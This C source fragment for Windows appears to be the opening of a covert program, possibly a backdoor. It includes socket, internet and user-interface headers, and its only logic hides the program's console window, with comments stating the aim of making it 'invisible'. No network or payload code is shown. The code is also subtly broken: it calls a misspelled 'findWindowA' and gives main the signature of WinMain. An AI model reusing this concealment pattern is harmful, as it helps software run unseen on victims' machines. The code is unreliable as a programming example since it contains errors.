#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h> // socket programming
#include <windows.h> // windows library
#include <winuser.h> // windows users
#include <wininet.h> // network library
#include <windowsx.h>
#include <string.h> // string manipulation
#include <sys/stat.h>
#include <sys/types.h>

// windows entrypoint
int APIENTRY main(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {
  HWND stealth; // make it invisible
  AllocConsole(); // new console
  stealth = findWindowA("ConsoleWindowClass", NULL); // handle to the top level Window
  ShowWindow(stealth, 0); // 0 is the nCmdShow
}
